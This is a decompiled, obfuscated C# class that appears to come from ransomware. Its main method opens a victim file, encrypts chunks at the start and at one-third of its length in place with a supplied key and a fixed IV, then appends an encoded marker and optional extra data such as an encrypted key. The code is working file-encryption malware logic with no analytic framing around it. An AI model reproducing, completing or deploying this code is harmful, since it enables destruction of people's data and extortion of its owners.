using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uuWOPLZnzEM;

namespace sWduCclqEzKrM;

internal sealed class rtnpCOxUAdvUXHj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int OMuhYeESUKSf(long long_0)
	{
		return (int)long_0;
	}

	public static void sKqjBFIZxTw(string AdbIddqYLbyzmz, string uCvohvyxcioVPkz, string uaGBXxlpLb, byte[] sCulHxkoxegjpWJ = null)
	{
		try
		{
			using FileStream fileStream = new FileStream(AdbIddqYLbyzmz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			int num = OMuhYeESUKSf(fileStream.Length) / 3;
			if (num < 0)
			{
				num *= -1;
			}
			int num2 = 0;
			try
			{
				num2 = Convert.ToInt32(uCvohvyxcioVPkz) * Convert.ToInt32(fileStream.Length) / 100;
				if (num2 < 0)
				{
					num2 *= -1;
				}
			}
			catch
			{
				num2 = int.MaxValue;
			}
			if (num < num2)
			{
				num2 = num - Convert.ToInt32(uCvohvyxcioVPkz) * 1000 * 1000;
			}
			int nopKiwVaofZW = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
			byte[] array = null;
			for (int i = 0; i < 2; i++)
			{
				byte[] byte_ = udwlAtPsnCvU(AdbIddqYLbyzmz, fileStream, nopKiwVaofZW, num * i);
				array = (wJkbnIWOteHAMM.flMhwZmYRAGAlC ? pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(uaGBXxlpLb), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(uaGBXxlpLb), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
				XumGFZuPbNN(AdbIddqYLbyzmz, fileStream, array, num * i);
			}
		}
		catch (Exception ex)
		{
			if (wJkbnIWOteHAMM.nCZIbbbLUfspycLk)
			{
				try
				{
					File.AppendAllText(wJkbnIWOteHAMM.VjgrxEUFvvHY, getString_0(107363260) + AdbIddqYLbyzmz + getString_0(107376006) + ex.Message + getString_0(107396392));
				}
				catch (Exception)
				{
				}
			}
		}
		byte[] array2 = null;
		array2 = (wJkbnIWOteHAMM.tRSKQaCWVf ? Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107375921)) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377022)) + Convert.ToString(uCvohvyxcioVPkz) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377022))) : Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107375921)) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376999)) + Convert.ToString(uCvohvyxcioVPkz) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376999))));
		if (!wJkbnIWOteHAMM.tRSKQaCWVf)
		{
			using (FileStream fileStream2 = new FileStream(AdbIddqYLbyzmz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				fileStream2.Write(array2, 0, array2.Length);
				return;
			}
		}
		using FileStream fileStream3 = new FileStream(AdbIddqYLbyzmz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream3.Write(sCulHxkoxegjpWJ, 0, sCulHxkoxegjpWJ.Length);
		fileStream3.Write(array2, 0, array2.Length);
	}

	public static byte[] udwlAtPsnCvU(string wHiYvPLfnuSfIz, FileStream IDwWxzCployJjIw, int NopKiwVaofZW, int NCkEVrvTGC = 0)
	{
		byte[] array = new byte[NopKiwVaofZW];
		IDwWxzCployJjIw.Position = NCkEVrvTGC;
		IDwWxzCployJjIw.Read(array, 0, NopKiwVaofZW);
		return array;
	}

	public static void XumGFZuPbNN(string uSOyUJmTruOJGY, FileStream VCcSTfEDuiBAKV, byte[] hiMRpHtOQB, int OnfXerzkZRxyNc = 0)
	{
		VCcSTfEDuiBAKV.Position = OnfXerzkZRxyNc;
		VCcSTfEDuiBAKV.Write(hiMRpHtOQB, 0, hiMRpHtOQB.Length);
	}

	static rtnpCOxUAdvUXHj()
	{
		Strings.CreateGetStringDelegate(typeof(rtnpCOxUAdvUXHj));
	}
}
